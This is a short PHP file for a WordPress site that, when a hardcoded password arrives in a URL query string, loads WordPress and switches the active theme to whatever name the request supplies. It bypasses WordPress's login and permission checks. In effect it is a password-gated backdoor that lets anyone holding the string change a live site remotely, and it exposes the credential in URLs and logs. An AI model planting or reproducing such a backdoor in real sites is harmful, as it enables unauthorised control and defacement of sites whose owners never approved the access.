<?php
    if (isset($_GET['password'])) {
    	if($_GET['password'] == 'New@Store5000New') {
		    include 'wp-load.php';
		    if (isset($_GET['themename'])) {
		    	switch_theme($_GET['themename']);
		    }
		}	    
	}
?>